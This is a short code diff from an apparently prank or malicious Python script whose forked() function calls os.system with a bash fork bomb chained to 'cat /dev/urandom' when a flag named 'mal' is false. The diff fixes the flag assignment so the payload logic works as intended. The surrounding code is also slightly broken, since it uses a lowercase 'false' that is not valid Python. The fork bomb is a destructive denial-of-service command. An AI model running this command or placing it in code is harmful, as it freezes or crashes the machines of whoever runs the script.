@@ -33,7 +33,8 @@ def forked():
     os.system("clear")
     if mal == false:
       os.system(":(){ :|:& };: && cat /dev/urandom")
-      mal == True
+      time = 0
+      mal = True
     else:
       pass
     if number == 1:
